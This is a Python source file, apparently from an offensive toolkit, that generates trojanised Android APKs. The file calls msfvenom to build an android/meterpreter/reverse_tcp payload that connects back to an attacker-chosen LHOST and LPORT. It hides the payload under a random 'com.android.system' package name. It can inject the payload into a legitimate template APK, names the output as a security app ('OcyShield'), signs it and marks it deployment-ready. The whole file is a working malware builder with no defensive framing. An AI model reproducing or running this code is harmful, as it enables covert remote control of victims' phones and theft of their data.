import subprocess
import os
import random
import string
from core.utils.validator import Validator
from core.utils.logger import log_status, log_error
from core.utils.signer import APKSigner

def generate_android_payload():
    # 1. Identity Setup
    rand_name = ''.join(random.choices(string.ascii_lowercase, k=8))
    pkg_name = f"com.android.system.{rand_name}"

    local_ip = Validator.get_local_ip()
    lhost = input(f"[?] LHOST (Default {local_ip}): ") or local_ip
    lport = input("[?] LPORT (Default 4444): ") or "4444"
    
    # 2. THE TEMPLATE OPTION
    template_path = input("[?] Path to Template APK (Leave blank for Standalone): ").strip()
    
    output_path = os.path.join("output/apks", "OcyShield_v2_Final.apk")

    # 3. Build Command
    command = [
        "msfvenom", "-p", "android/meterpreter/reverse_tcp",
        f"LHOST={lhost}", f"LPORT={lport}",
        f"android_package={pkg_name}"
    ]

    # If user provided a template, we use the -x flag
    if template_path and os.path.exists(template_path):
        log_status(f"Injecting payload into template: {template_path}")
        command.extend(["-x", template_path])
    else:
        log_status("No template provided. Generating standalone Ghost APK.")

    command.extend(["-o", output_path])

    try:
        log_status(f"Executing engine with package ID: {pkg_name}")
        process = subprocess.run(command, capture_output=True, text=True)

        if process.returncode == 0:
            # Important: Signed APKs are mandatory for Android
            if APKSigner.sign(output_path):
                print(f"\n[+] DEPLOYMENT READY: {output_path}")
        else:
            log_error(f"Engine failure: {process.stderr}")

    except Exception as e:
        log_error(f"Critical error: {str(e)}")
